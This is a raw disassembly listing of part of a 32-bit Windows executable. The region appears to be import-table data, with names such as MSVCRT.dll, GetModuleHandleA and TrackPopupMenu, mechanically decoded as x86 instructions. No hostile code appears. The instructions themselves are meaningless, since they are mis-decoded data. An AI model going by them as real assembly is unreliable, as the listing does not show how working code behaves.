  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
  41275a:	add    DWORD PTR [eax],eax
  41275c:	push   0x31
  41275e:	add    DWORD PTR [eax],eax
  412760:	js     0x412793
  412762:	add    DWORD PTR [eax],eax
  412764:	xchg   esi,eax
  412765:	xor    DWORD PTR [ecx],eax
  412767:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	shl    BYTE PTR [ecx],cl
  412772:	add    DWORD PTR [eax],eax
  412774:	in     al,0x31
  412776:	add    DWORD PTR [eax],eax
  412778:	cld    
  412779:	xor    DWORD PTR [ecx],eax
  41277b:	add    BYTE PTR [edx],cl
  41277d:	xor    al,BYTE PTR [ecx]
  41277f:	add    BYTE PTR [eax],al
  412781:	add    BYTE PTR [eax],al
  412783:	add    BYTE PTR [edx+esi*1],ch
  412786:	add    DWORD PTR [eax],eax
  412788:	inc    esp
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    BYTE PTR [esi+0x32],dl
  41278e:	add    DWORD PTR [eax],eax
  412790:	outs   dx,BYTE PTR ds:[esi]
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    BYTE PTR [eax-0x63fffece],al
  412799:	xor    al,BYTE PTR [ecx]
  41279b:	add    BYTE PTR [eax],al
  41279d:	add    BYTE PTR [eax],al
  41279f:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	out    0x32,al
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cli    
  4127ad:	xor    al,BYTE PTR [ecx]
  4127af:	add    BYTE PTR [edx],cl
  4127b1:	xor    eax,DWORD PTR [ecx]
  4127b3:	add    BYTE PTR [eax],ah
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi],dh
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    BYTE PTR [ebx+esi*1+0x1],al
  4127bf:	add    BYTE PTR [eax+0x33],dl
  4127c2:	add    DWORD PTR [eax],eax
  4127c4:	pop    esp
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    BYTE PTR [esi+0x33],ah
  4127ca:	add    DWORD PTR [eax],eax
  4127cc:	je     0x412801
  4127ce:	add    DWORD PTR [eax],eax
  4127d0:	xor    BYTE PTR [ebx],0x1
  4127d3:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4127da:	add    DWORD PTR [eax],eax
  4127dc:	ret    0x133
  4127df:	add    dh,dl
  4127e1:	xor    eax,DWORD PTR [ecx]
  4127e3:	add    dh,ch
  4127e5:	xor    eax,DWORD PTR [ecx]
  4127e7:	add    ah,bh
  4127e9:	xor    eax,DWORD PTR [ecx]
  4127eb:	add    BYTE PTR [esi],dl
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [edx],ch
  4127f1:	xor    al,0x1
  4127f3:	add    BYTE PTR [esp+esi*1],dh
  4127f6:	add    DWORD PTR [eax],eax
  4127f8:	inc    esp
  4127f9:	xor    al,0x1
  4127fb:	add    BYTE PTR [esi+0x34],cl
  4127fe:	add    DWORD PTR [eax],eax
  412800:	pop    edx
  412801:	xor    al,0x1
  412803:	add    BYTE PTR [esi+0x34],ch
  412806:	add    DWORD PTR [eax],eax
  412808:	xchg   BYTE PTR [ecx+eax*1],dh
  41280b:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  412812:	add    DWORD PTR [eax],eax
  412814:	mov    dl,0x34
  412816:	add    DWORD PTR [eax],eax
  412818:	enter  0x134,0x0
  41281c:	fidiv  DWORD PTR [ecx+eax*1]
  41281f:	add    dh,ah
  412821:	xor    al,0x1
  412823:	add    dl,bh
  412825:	xor    al,0x1
  412827:	add    BYTE PTR [esi*1+0x350e0001],al
  41282e:	add    DWORD PTR [eax],eax
  412830:	push   ds
  412831:	xor    eax,0x35360001
  412836:	add    DWORD PTR [eax],eax
  412838:	dec    edx
  412839:	xor    eax,0x355a0001
  41283e:	add    DWORD PTR [eax],eax
  412840:	xor    ax,0x1
  412844:	je     0x41287b
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    dh,BYTE PTR ds:0x359c0001
  41284e:	add    DWORD PTR [eax],eax
  412850:	add    BYTE PTR [eax],al
  412852:	add    BYTE PTR [eax],al
  412854:	mov    edx,0xce000135
  412859:	xor    eax,0x35e00001
  41285e:	add    DWORD PTR [eax],eax
  412860:	in     al,dx
  412861:	xor    eax,0x36040001
  412866:	add    DWORD PTR [eax],eax
  412868:	adc    al,0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	sub    BYTE PTR [esi],dh
  41286e:	add    DWORD PTR [eax],eax
  412870:	ds add DWORD PTR ss:[eax],eax
  412874:	dec    esi
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	pusha  
  412879:	add    DWORD PTR ss:[eax],eax
  41287c:	ins    BYTE PTR es:[edi],dx
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	xor    BYTE PTR [esi],0x1
  412883:	add    BYTE PTR [esi-0x49fffeca],bl
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	retf   0x136
  41288f:	add    dl,bl
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	out    0x36,al
  412896:	add    DWORD PTR [eax],eax
  412898:	(bad)  
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	adc    BYTE PTR [edi],dh
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	and    dh,BYTE PTR [edi]
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	xor    dh,BYTE PTR [edi]
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	inc    esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	push   eax
  4128ad:	aaa    
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	pusha  
  4128b1:	aaa    
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	outs   dx,BYTE PTR ds:[esi]
  4128b5:	aaa    
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	js     0x4128f1
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    BYTE PTR [edi],dh
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	xchg   esi,eax
  4128c1:	aaa    
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	test   al,0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	mov    esi,0xd2000137
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jmp    0x138:0x137
  4128d7:	add    BYTE PTR [esi],cl
  4128d9:	cmp    BYTE PTR [ecx],al
  4128db:	add    BYTE PTR [esi],ah
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1],bh
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	dec    esp
  4128e5:	cmp    BYTE PTR [ecx],al
  4128e7:	add    BYTE PTR [eax+0x38],bl
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	jo     0x412926
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	jle    0x41292a
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	xchg   edx,eax
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [esi-0x51fffec8],bl
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dh,al
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    dl,bl
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    al,ch
  412909:	cmp    BYTE PTR [ecx],al
  41290b:	add    dh,bh
  41290d:	cmp    BYTE PTR [ecx],al
  41290f:	add    BYTE PTR [edx],dl
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [esi],bl
  412915:	cmp    DWORD PTR [ecx],eax
  412917:	add    BYTE PTR [eax],bh
  412919:	cmp    DWORD PTR [ecx],eax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412923:	add    BYTE PTR [edx+0x39],dh
  412926:	add    DWORD PTR [eax],eax
  412928:	add    BYTE PTR [eax],al
  41292a:	add    BYTE PTR [eax],al
  41292c:	xchg   edi,eax
  41292d:	add    ebp,DWORD PTR [ecx+0x73]
  412930:	imul   esp,DWORD PTR fs:[edi+0x69],0x41f0074
  412938:	ja     0x41299d
  41293a:	jae    0x41299f
  41293c:	ins    DWORD PTR es:[edi],dx
  41293d:	jo     0x41293f
  41293f:	add    ch,dh
  412941:	add    BYTE PTR [edi+0x63],bl
  412944:	outs   dx,DWORD PTR ds:[esi]
  412945:	outs   dx,BYTE PTR ds:[esi]
  412946:	je     0x4129ba
  412948:	outs   dx,DWORD PTR ds:[esi]
  412949:	ins    BYTE PTR es:[edi],dx
  41294a:	data16 jo 0x41294d
  41294d:	add    BYTE PTR [ebp+0x74656703],cl
  412953:	outs   dx,BYTE PTR gs:[esi]
  412955:	jbe    0x412957
  412957:	add    BYTE PTR ds:0x73637704,ch
  41295d:	jb     0x4129c2
  41295f:	push   0x3f20072
  412964:	jae    0x4129da
  412966:	jb     0x4129d6
  412968:	arpl   WORD PTR [eax+0x79],si
  41296b:	add    al,ch
  41296d:	add    esi,DWORD PTR [ebx+0x74]
  412970:	jb     0x4129d5
  412972:	jo     0x4129ed
  412974:	add    BYTE PTR [eax],al
  412976:	mov    bl,0x0
  412978:	pop    edi
  412979:	pop    edi
  41297a:	jae    0x4129e1
  41297c:	je     0x4129dd
  41297e:	popa   
  41297f:	jo     0x4129f1
  412981:	pop    edi
  412982:	je     0x4129fd
  412984:	jo     0x4129eb
  412986:	add    BYTE PTR [eax],al
  412988:	lds    eax,FWORD PTR [ebx]
  41298a:	jo     0x4129fe
  41298c:	imul   ebp,DWORD PTR [esi+0x74],0xcc000066
  412993:	add    esi,DWORD PTR [ecx+0x73]
  412996:	outs   dx,DWORD PTR ds:[esi]
  412997:	jb     0x412a0d
  412999:	add    BYTE PTR [edx+0x3],dh
  41299c:	data16 ins BYTE PTR es:[edi],dx
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	outs   dx,DWORD PTR ds:[esi]
  4129a0:	jb     0x4129a2
  4129a2:	lods   al,BYTE PTR ds:[esi]
  4129a3:	add    ebp,DWORD PTR [ecx+0x73]
  4129a6:	js     0x412a0c
  4129a8:	imul   esp,DWORD PTR [edi+0x69],0xa0000074
  4129af:	add    BYTE PTR [edi+0x5f],bl
  4129b2:	jo     0x412a13
  4129b4:	pop    edi
  4129b5:	ins    WORD PTR es:[edi],dx
  4129b7:	outs   dx,DWORD PTR ds:[esi]
  4129b8:	fs add BYTE PTR gs:[eax],al
  4129bc:	xor    eax,0x73637704
  4129c1:	je     0x412a32
  4129c3:	ins    BYTE PTR es:[edi],dx
  4129c4:	add    BYTE PTR [eax],al
  4129c6:	or     al,0x4
  4129c8:	je     0x412a39
  4129ca:	ja     0x412a41
  4129cc:	jo     0x412a3e
  4129ce:	gs jb  0x4129d1
  4129d1:	add    cl,dh
  4129d3:	add    esi,DWORD PTR [ebx+0x74]
  4129d6:	jb     0x412a46
  4129d8:	arpl   WORD PTR [ebp+0x70],bp
  4129db:	add    BYTE PTR [ebx+0x705f5f00],bl
  4129e1:	pop    edi
  4129e2:	pop    edi
  4129e3:	arpl   WORD PTR [edi+0x6d],bp
  4129e6:	ins    DWORD PTR es:[edi],dx
  4129e7:	outs   dx,DWORD PTR ds:[esi]
  4129e8:	fs add BYTE PTR gs:[eax],al
  4129ec:	push   es
  4129ed:	add    al,0x74
  4129ef:	imul   ebp,DWORD PTR [ebp+0x65],0x38b0000
  4129f6:	addr16 gs je 0x412a5d
  4129fa:	add    BYTE PTR [eax],al
  4129fc:	xor    eax,DWORD PTR [edi+esi*2]
  4129ff:	arpl   WORD PTR [ebx+0x74],si
  412a02:	outs   dx,DWORD PTR ds:[esi]
  412a03:	imul   eax,DWORD PTR [eax],0x0
  412a06:	test   eax,0x77736903
  412a0b:	jae    0x412a7d
  412a0d:	popa   
  412a0e:	arpl   WORD PTR [ebp+0x0],sp
  412a11:	add    BYTE PTR [ebx+0x77736903],ch
  412a17:	js     0x412a7d
  412a19:	imul   esp,DWORD PTR [edi+0x69],0xdb0074
  412a20:	pop    edi
  412a21:	popa   
  412a22:	ins    DWORD PTR es:[edi],dx
  412a23:	jae    0x412a8c
  412a25:	pop    edi
  412a26:	gs js  0x412a92
  412a29:	je     0x412a2b
  412a2b:	add    BYTE PTR [ecx],ah
  412a2d:	add    al,0x77
  412a2f:	arpl   WORD PTR [ebx+0x63],si
  412a32:	jo     0x412aad
  412a34:	add    BYTE PTR [eax],al
  412a36:	xchg   BYTE PTR [ecx],al
  412a38:	pop    edi
  412a39:	imul   ebp,DWORD PTR [esi+0x69],0x72657474
  412a40:	ins    DWORD PTR es:[edi],dx
  412a41:	add    BYTE PTR [ebx+eax*1+0x6c617369],dl
  412a48:	outs   dx,BYTE PTR ds:[esi]
  412a49:	jne    0x412ab8
  412a4b:	add    ch,dh
  412a4d:	add    esi,DWORD PTR [ebx+0x74]
  412a50:	jb     0x412ac2
  412a52:	bound  esi,QWORD PTR [edx+0x6b]
  412a55:	add    BYTE PTR [esi+0x73695f01],bl
  412a5b:	ins    DWORD PTR es:[edi],dx
  412a5c:	bound  esp,QWORD PTR [edx+0x6c]
  412a5f:	gs popa 
  412a61:	add    BYTE PTR fs:[eax],al
  412a64:	sbb    BYTE PTR [esi+esi*2],al
  412a67:	jae    0x412ae0
  412a69:	jo     0x412add
  412a6b:	imul   ebp,DWORD PTR [esi+0x74],0x36d0066
  412a72:	data16 addr16 gs je 0x412ada
  412a77:	add    BYTE PTR [edx+0x0],dl
  412a7a:	pop    edi
  412a7b:	pop    eax
  412a7c:	arpl   WORD PTR [eax+0x74],si
  412a7f:	inc    esi
  412a80:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4290072
  412a88:	ja     0x412aed
  412a8a:	jae    0x412afa
  412a8c:	arpl   WORD PTR [eax+0x79],si
  412a8f:	add    BYTE PTR [ebx],ah
  412a91:	add    DWORD PTR [edi+0x65],ebx
  412a94:	js     0x412aff
  412a96:	je     0x412a98
  412a98:	imul   eax,DWORD PTR [ebx],0x6f6c6366
  412a9e:	jae    0x412b05
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	call   0x65a489a7
  412aa7:	js     0x412b12
  412aa9:	je     0x412aab
  412aab:	add    bh,al
  412aad:	add    esi,DWORD PTR [eax+0x75]
  412ab0:	je     0x412b15
  412ab2:	add    BYTE PTR [eax],al
  412ab4:	fadd   DWORD PTR [ebx]
  412ab6:	jae    0x412b1d
  412ab8:	je     0x412b26
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	arpl   WORD PTR [ecx+0x6c],sp
  412abe:	add    BYTE PTR gs:[ebp+0x735f5f00],dh
  412ac5:	gs je  0x412b3d
  412ac8:	jae    0x412b2f
  412aca:	jb     0x412b39
  412acc:	popa   
  412acd:	je     0x412b37
  412acf:	gs jb  0x412b44
  412ad2:	add    BYTE PTR [eax],al
  412ad4:	mov    BYTE PTR [ebx],al
  412ad6:	data16 ja 0x412b4b
  412ad9:	imul   esi,DWORD PTR [ebp+eiz*2+0x0],0x7003c300
  412ae1:	gs jb  0x412b56
  412ae4:	outs   dx,DWORD PTR ds:[esi]
  412ae5:	jb     0x412ae7
  412ae7:	add    BYTE PTR [edx+0x3],bl
  412aea:	popa   
  412aeb:	je     0x412b5c
  412aed:	ins    BYTE PTR es:[edi],dx
  412aee:	add    BYTE PTR [eax],al
  412af0:	jb     0x412af2
  412af2:	pop    edi
  412af3:	pop    edi
  412af4:	addr16 gs je 0x412b65
  412af8:	popa   
  412af9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b00:	sub    BYTE PTR [edi+esi*2],al
  412b03:	arpl   WORD PTR [ebx+0x6e],si
  412b06:	arpl   WORD PTR [ebp+0x70],bp
  412b09:	add    dl,dl
  412b0b:	add    esi,DWORD PTR [edx+0x65]
  412b0e:	ins    DWORD PTR es:[edi],dx
  412b0f:	outs   dx,DWORD PTR ds:[esi]
  412b10:	jbe    0x412b77
  412b12:	add    BYTE PTR [eax],al
  412b14:	dec    ebp
  412b15:	push   ebx
  412b16:	push   esi
  412b17:	inc    ebx
  412b18:	push   edx
  412b19:	push   esp
  412b1a:	cs fs ins BYTE PTR es:[edi],dx
  412b1d:	ins    BYTE PTR es:[edi],dx
  412b1e:	add    BYTE PTR [eax],al
  412b20:	mov    edi,0x636f4c01
  412b25:	imul   edx,DWORD PTR [edi+0x69],0x6e
  412b29:	outs   dx,DWORD PTR fs:[esi]
  412b2b:	ja     0x412b82
  412b2d:	jo     0x412b93
  412b2f:	popa   
  412b30:	je     0x412b97
  412b32:	add    BYTE PTR [eax],al
  412b34:	nop
  412b35:	add    dl,BYTE PTR [edx+esi*2+0x61]
  412b39:	arpl   WORD PTR [ebx+0x50],bp
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	jo     0x412bb4
  412b3f:	jo     0x412b8e
  412b41:	outs   dx,BYTE PTR gs:[esi]
  412b43:	jne    0x412b45
  412b45:	add    BYTE PTR [eax],bh
  412b47:	add    dl,BYTE PTR [ebx+0x65]
  412b4a:	je     0x412b8f
  412b4c:	jne    0x412bc0
  412b4e:	jae    0x412bbf
  412b50:	jb     0x412b52
  412b52:	mov    eax,ds:0x57734901
  412b57:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412b5e:	popa   
  412b5f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412b63:	add    BYTE PTR [ecx+0x536e4901],al
  412b69:	outs   dx,BYTE PTR gs:[esi]
  412b6b:	fs dec ebp
  412b6d:	gs jae 0x412be3
  412b70:	popa   
  412b71:	addr16 gs inc ebp
  412b74:	js     0x412b76
  412b76:	xchg   ebx,eax
  412b77:	add    BYTE PTR [ebp+eiz*2+0x73],al
  412b7b:	je     0x412bef
  412b7d:	outs   dx,DWORD PTR ds:[esi]
  412b7e:	jns    0x412bc1
  412b80:	arpl   WORD PTR [ebx+0x65],sp
  412b83:	ins    BYTE PTR es:[edi],dx
  412b84:	gs jb  0x412be8
  412b87:	je     0x412bf8
  412b89:	jb     0x412bdf
  412b8b:	popa   
  412b8c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b90:	adc    eax,DWORD PTR [ecx]
  412b92:	inc    edi
  412b93:	gs je  0x412bda
  412b96:	outs   dx,DWORD PTR ds:[esi]
  412b97:	jne    0x412bfb
  412b99:	ins    BYTE PTR es:[edi],dx
  412b9a:	gs inc ebx
  412b9c:	ins    BYTE PTR es:[edi],dx
  412b9d:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  412ba4:	add    BYTE PTR [eax],al
  412ba6:	mov    ds:0x57734901,eax
  412bab:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  412bb2:	jae    0x412c1d
  412bb4:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412bb8:	mov    al,0x1
  412bba:	dec    esp
  412bbb:	outs   dx,DWORD PTR ds:[esi]
  412bbc:	popa   
  412bbd:	fs dec ecx
  412bbf:	arpl   WORD PTR [edi+0x6e],bp
  412bc2:	push   edi
  412bc3:	add    BYTE PTR [ebp+0x79656b02],bh
  412bc9:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  412bcd:	jbe    0x412c34
  412bcf:	outs   dx,BYTE PTR ds:[esi]
  412bd0:	je     0x412bd2
  412bd2:	test   eax,0x616f4c01
  412bd7:	fs inc edx
  412bd9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x58004170
  412be1:	add    dl,BYTE PTR [ebx+0x65]
  412be4:	je     0x412c38
  412be6:	arpl   WORD PTR gs:[eax+eax*1-0x1e],si
  412beb:	add    BYTE PTR [esi+0x69],al
  412bee:	outs   dx,BYTE PTR ds:[esi]
  412bef:	fs push edi
  412bf1:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412bf8:	inc    ecx
  412bf9:	add    cl,bh
  412bfb:	add    BYTE PTR [edi+0x65],al
  412bfe:	je     0x412c43
  412c00:	ins    BYTE PTR es:[edi],dx
  412c01:	popa   
  412c02:	jae    0x412c77
  412c04:	dec    esp
  412c05:	outs   dx,DWORD PTR ds:[esi]
  412c06:	outs   dx,BYTE PTR ds:[esi]
  412c07:	addr16 push edi
  412c09:	add    BYTE PTR ds:0x6e655302,ah
  412c0f:	fs dec ecx
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	jo     0x412c89
  412c14:	je     0x412c16
  412c16:	cdq    
  412c17:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412c1b:	ins    BYTE PTR es:[edi],dx
  412c1c:	outs   dx,DWORD PTR ds:[esi]
  412c1d:	addr16 inc edx
  412c1f:	outs   dx,DWORD PTR ds:[esi]
  412c20:	js     0x412c6b
  412c22:	outs   dx,BYTE PTR ds:[esi]
  412c23:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  412c2b:	jb     0x412c8e
  412c2d:	ins    DWORD PTR es:[edi],dx
  412c2e:	inc    ecx
  412c2f:	add    BYTE PTR [edi+0x70737702],bh
  412c35:	jb     0x412ca0
  412c37:	outs   dx,BYTE PTR ds:[esi]
  412c38:	je     0x412ca0
  412c3a:	inc    ecx
  412c3b:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  412c42:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x654700f8
  412c4a:	je     0x412c8f
  412c4c:	ins    BYTE PTR es:[edi],dx
  412c4d:	popa   
  412c4e:	jae    0x412cc3
  412c50:	dec    esp
  412c51:	outs   dx,DWORD PTR ds:[esi]
  412c52:	outs   dx,BYTE PTR ds:[esi]
  412c53:	addr16 inc ecx
  412c55:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  412c5c:	outs   dx,DWORD PTR ds:[esi]
  412c5d:	outs   dx,BYTE PTR ds:[esi]
  412c5e:	imul   esp,DWORD PTR [ebx+0x0],0x47014200
  412c65:	gs je  0x412cb6
  412c68:	gs js  0x412cdf
  412c6b:	inc    esp
  412c6c:	ins    BYTE PTR es:[edi],dx
  412c6d:	addr16 inc edi
  412c6f:	jb     0x412ce0
  412c71:	jne    0x412ce3
  412c73:	dec    ecx
  412c74:	je     0x412cdb
  412c76:	ins    DWORD PTR es:[edi],dx
  412c77:	add    BYTE PTR [ebx+0x61724400],dh
  412c7d:	ja     0x412cc8
  412c7f:	arpl   WORD PTR [edi+0x6e],bp
  412c82:	add    BYTE PTR [eax],al
  412c84:	jmp    0x65b17b8a
  412c89:	outs   dx,BYTE PTR ds:[esi]
  412c8a:	dec    ecx
  412c8b:	outs   dx,BYTE PTR ds:[esi]
  412c8c:	jo     0x412d03
  412c8e:	je     0x412cd4
  412c90:	gs jae 0x412cfe
  412c93:	je     0x412d04
  412c95:	jo     0x412c97
  412c97:	add    dh,bh
  412c99:	add    BYTE PTR [edi+0x65],al
  412c9c:	je     0x412ce1
  412c9e:	ins    BYTE PTR es:[edi],dx
  412c9f:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  412ca6:	jb     0x412ca8
  412ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca9:	add    DWORD PTR [ecx+0x73],ecx
  412cac:	pop    edx
  412cad:	outs   dx,DWORD PTR ds:[esi]
  412cae:	outs   dx,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	gs add BYTE PTR fs:[eax],al
  412cb4:	rol    DWORD PTR [eax],0x45
  412cb7:	outs   dx,BYTE PTR ds:[esi]
  412cb8:	popa   
  412cb9:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  412cbd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412cc4:	sub    BYTE PTR [eax],al
  412cc6:	inc    ebx
  412cc7:	push   0x6f4c7261
  412ccc:	ja     0x412d33
  412cce:	jb     0x412d12
  412cd0:	jne    0x412d38
  412cd2:	push   di
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	inc    ebx
  412cd7:	add    BYTE PTR [ebx+0x6c],al
  412cda:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  412ce1:	arpl   WORD PTR [edx+0x65],si
  412ce4:	outs   dx,BYTE PTR gs:[esi]
  412ce6:	add    BYTE PTR [eax],al
  412ce8:	add    eax,DWORD PTR [eax]
  412cea:	inc    ecx
  412ceb:	fs push 0x75
  412cee:	jae    0x412d64
  412cf0:	push   edi
  412cf1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  412cf8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  412cfc:	add    BYTE PTR [eax],al
  412cfe:	icebp  
  412cff:	add    DWORD PTR [eax+0x6f],edx
  412d02:	jae    0x412d78
  412d04:	dec    ebp
  412d05:	gs jae 0x412d7b
  412d08:	popa   
  412d09:	addr16 gs inc ecx
  412d0c:	add    BYTE PTR [eax],al
  412d0e:	out    dx,al
  412d0f:	add    DWORD PTR [eax+0x65],edx
  412d12:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  412d17:	jae    0x412d7a
  412d19:	addr16 gs inc ecx
  412d1c:	add    BYTE PTR [eax],al
  412d1e:	dec    ebx
  412d1f:	add    DWORD PTR [edi+0x65],eax
  412d22:	je     0x412d74
  412d24:	jb     0x412d95
  412d26:	jo     0x412d7f
  412d28:	add    BYTE PTR [eax],al
  412d2a:	inc    esi
  412d2b:	add    BYTE PTR [ebx+0x6c],al
  412d2e:	outs   dx,DWORD PTR ds:[esi]
  412d2f:	jae    0x412d96
  412d31:	inc    esp
  412d32:	gs jae 0x412da0
  412d35:	je     0x412da6
  412d37:	jo     0x412d39
  412d39:	add    cl,cl
  412d3b:	add    DWORD PTR [ebp+0x61],ecx
  412d3e:	jo     0x412d97
  412d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  412d47:	imul   ebp,DWORD PTR [esi+0x74],0x2020073
  412d4e:	push   edx
  412d4f:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  412d58:	popa   
  412d59:	jae    0x412dce
  412d5b:	inc    ecx
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	mov    es,WORD PTR [ecx]
  412d60:	dec    ecx
  412d61:	jae    0x412da6
  412d63:	push   0x6c417261
  412d68:	jo     0x412dd2
  412d6a:	popa   
  412d6b:	dec    esi
  412d6c:	jne    0x412ddb
  412d6e:	gs jb  0x412dda
  412d71:	arpl   WORD PTR [edi+0x0],dx
  412d74:	mov    cl,0x1
  412d76:	dec    esp
  412d77:	outs   dx,DWORD PTR ds:[esi]
  412d78:	popa   
  412d79:	fs dec ecx
  412d7b:	ins    DWORD PTR es:[edi],dx
  412d7c:	popa   
  412d7d:	addr16 gs inc ecx
  412d80:	add    BYTE PTR [eax],al
  412d82:	sahf   
  412d83:	add    DWORD PTR [ecx+0x73],ecx
  412d86:	push   edx
  412d87:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  412d8c:	jo     0x412e02
  412d8e:	jns    0x412d90
  412d90:	mov    es,WORD PTR [edx]
  412d92:	push   esp
  412d93:	outs   dx,DWORD PTR ds:[esi]
  412d94:	push   ebp
  412d95:	outs   dx,BYTE PTR ds:[esi]
  412d96:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  412d9d:	add    BYTE PTR [ebx],bh
  412d9f:	add    DWORD PTR [edi+0x65],eax
  412da2:	je     0x412df1
  412da4:	gs jae 0x412e1a
  412da7:	popa   
  412da8:	addr16 gs inc ebp
  412dab:	js     0x412e21
  412dad:	jb     0x412e10
  412daf:	dec    ecx
  412db0:	outs   dx,BYTE PTR ds:[esi]
  412db1:	outs   dx,WORD PTR ds:[esi]
  412db3:	add    BYTE PTR [ebp+0x1],al
  412db6:	inc    edi
  412db7:	gs je  0x412e0a
  412dba:	popa   
  412dbb:	jb     0x412e22
  412dbd:	outs   dx,BYTE PTR ds:[esi]
  412dbe:	je     0x412dc0
  412dc0:	bound  eax,QWORD PTR [eax]
  412dc2:	inc    ebx
  412dc3:	jb     0x412e2a
  412dc5:	popa   
  412dc6:	je     0x412e2d
  412dc8:	push   edi
  412dc9:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  412dd0:	inc    ecx
  412dd1:	add    BYTE PTR [ecx+0x766e4901],cl
  412dd7:	popa   
  412dd8:	ins    BYTE PTR es:[edi],dx
  412dd9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412de1:	je     0x412de3
  412de3:	add    BYTE PTR [ebp+0x2],ch
